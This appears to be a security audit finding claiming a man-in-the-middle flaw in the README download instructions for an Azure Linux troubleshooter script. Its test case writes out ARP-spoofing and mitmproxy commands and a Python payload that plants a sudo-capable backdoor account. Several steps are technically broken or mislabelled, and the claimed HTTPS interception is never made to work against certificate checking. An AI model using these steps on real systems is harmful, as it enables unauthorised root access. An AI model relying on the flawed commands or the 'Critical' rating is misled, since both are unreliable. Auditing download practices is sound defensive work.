#### 1. MITM vulnerability during script download

- **Description:**
    - The `README.md` file provides instructions to download the `UM_Linux_Troubleshooter_Offline.py` script using `wget` over `https` from `raw.githubusercontent.com`.
    - An attacker positioned to perform a Man-in-The-Middle (MITM) attack can intercept the HTTPS request for the script.
    - The attacker can then replace the legitimate `UM_Linux_Troubleshooter_Offline.py` script with a malicious script of their choosing.
    - The user, following the instructions, proceeds to execute the downloaded script using `sudo python UM_Linux_Troubleshooter_Offline.py`, granting the malicious script root privileges.

- **Impact:**
    - **Critical**. Successful exploitation of this vulnerability allows a remote attacker to execute arbitrary code with root privileges on the victim's machine. This can lead to complete system compromise, including data theft, malware installation, and denial of service.

- **Vulnerability Rank:** Critical

- **Currently Implemented Mitigations:**
    - None. The project currently relies on the implicit security of HTTPS for downloading the script, but does not implement any explicit integrity checks.

- **Missing Mitigations:**
    - **Integrity Verification:** Implement a mechanism to verify the integrity of the downloaded script. This could be achieved by:
        - Providing a checksum (e.g., SHA256 hash) of the script in the `README.md` file and instructing users to verify the checksum after downloading.
        - Digitally signing the script and providing instructions for users to verify the signature before execution.
    - **Security Warning in Documentation:** Explicitly mention the MITM vulnerability risk in the `README.md` and `SECURITY.md` files, warning users about the importance of downloading the script from a trusted and secure network.
    - **Alternative Secure Download Method:** Consider providing alternative secure download methods, such as downloading from a dedicated Azure endpoint with enforced integrity checks, if feasible.

- **Preconditions:**
    - **MITM Attack Capability:** The attacker must be capable of performing a Man-in-The-Middle attack on the network path between the user's machine and `raw.githubusercontent.com`. This could be achieved in various scenarios, such as:
        - Attacking a public Wi-Fi network.
        - Compromising the user's local network.
        - DNS spoofing.
        - BGP hijacking.
        - Compromising network infrastructure along the route.
    - **User Follows Instructions:** The user must follow the instructions in the `README.md` file to download and execute the script.
    - **User Executes with Sudo:** The user must execute the script using `sudo`, which is part of the provided instructions, to grant elevated privileges to the potential malicious script.

- **Source Code Analysis:**
    - **`README.md` (Instructions for downloading and running the script):**
        ```markdown
        # to run linux troubleshooter [compatible with python3]
        sudo wget https://raw.githubusercontent.com/Azure/updatemanagement/main/UM_Linux_Troubleshooter_Offline.py
        sudo python UM_Linux_Troubleshooter_Offline.py
        ```
        - The instructions use `wget` to download the script from `raw.githubusercontent.com` over `https`. While HTTPS provides encryption, it does not inherently prevent MITM attacks if the client doesn't verify server certificates properly or if the attacker can compromise the connection before HTTPS is fully established or via other means.
        - **Absence of Integrity Check:** There are no instructions to verify the integrity of the downloaded script before execution. The user directly executes the downloaded script.
        - **`sudo` Execution:** The instructions explicitly use `sudo` to execute the script, which is necessary for many troubleshooting tasks within the script but also elevates the risk significantly if a malicious script is executed.

- **Security Test Case:**
    1. **Set up MITM Attack Environment:** Configure a machine as a MITM attacker. This can be done using tools like `mitmproxy`, `Ettercap`, or `BetterCAP`. For example, using `mitmproxy`:
        ```bash
        # On attacker machine:
        sudo apt-get install mitmproxy  # Or appropriate installation for your system
        sudo ip route get 1.2.3.4 | awk '{print $3}' # Get gateway IP
        GATEWAY_IP=$(sudo ip route get 1.2.3.4 | awk '{print $3}')
        VICTIM_IP=<victim_machine_ip>
        sudo arpspoof -i <attacker_interface> -t $VICTIM_IP $GATEWAY_IP &
        sudo arpspoof -i <attacker_interface> -t $GATEWAY_IP $VICTIM_IP &
        sudo iptables -P FORWARD ACCEPT # Enable IP forwarding
        mitmproxy --ssl-insecure
        ```
    2. **Create Malicious Script (`malicious_script.py`):** Create a simple malicious Python script that will be used to replace the legitimate script during the MITM attack. For example, to create a backdoor user:
        ```python
        #!/usr/bin/env python
        import os
        import subprocess

        def create_backdoor_user():
            username = "backdoor_user"
            password = "P@$$wOrd123" # Choose a more robust password in real scenarios
            try:
                subprocess.run(["useradd", "-m", "-p", password, "-s", "/bin/bash", username], check=True)
                subprocess.run(["usermod", "-aG", "sudo", username], check=True)
                print(f"Backdoor user '{username}' created with sudo privileges.")
            except subprocess.CalledProcessError as e:
                print(f"Error creating backdoor user: {e}")

        if __name__ == "__main__":
            print("Malicious script executed with root privileges!")
            create_backdoor_user()
        ```
    3. **Configure MITM Proxy to Replace Script:** Configure `mitmproxy` (or your chosen MITM tool) to intercept the request to `raw.githubusercontent.com/Azure/updatemanagement/main/UM_Linux_Troubleshooter_Offline.py` and replace the response with the content of `malicious_script.py`. In `mitmproxy`, you can use a simple inline script or a more complex Python script. For a quick inline script, you can use `sed` to replace the body:
        ```bash
        # Assuming malicious_script.py is in the same directory as mitmproxy command
        MALICIOUS_SCRIPT_CONTENT=$(cat malicious_script.py)
        mitmproxy --ssl-insecure -q -s '(flow) => { if flow.request.pretty_url == "https://raw.githubusercontent.com/Azure/updatemanagement/main/UM_Linux_Troubleshooter_Offline.py": flow.response = mitmproxy.http.Response.make(200, "'"$MALICIOUS_SCRIPT_CONTENT"'", {"Content-Type": "text/plain"}) }'
        ```
    4. **Execute Download Command on Victim Machine:** On the victim machine, execute the download command as instructed in `README.md`:
        ```bash
        sudo wget https://raw.githubusercontent.com/Azure/updatemanagement/main/UM_Linux_Troubleshooter_Offline.py
        ```
    5. **Execute the Script on Victim Machine:** Execute the downloaded script with `sudo`:
        ```bash
        sudo python UM_Linux_Troubleshooter_Offline.py
        ```
    6. **Verify Successful Exploit:** Check if the malicious script was executed with root privileges. In this test case, verify if the backdoor user `backdoor_user` has been created on the victim machine and has sudo privileges:
        ```bash
        id backdoor_user
        sudo -l -U backdoor_user
        ```
        If the user exists and has sudo privileges, the MITM attack and vulnerability exploitation are successful.

This test case demonstrates that an attacker can successfully inject malicious code by intercepting the script download and gain root access to the victim's system, confirming the MITM vulnerability.
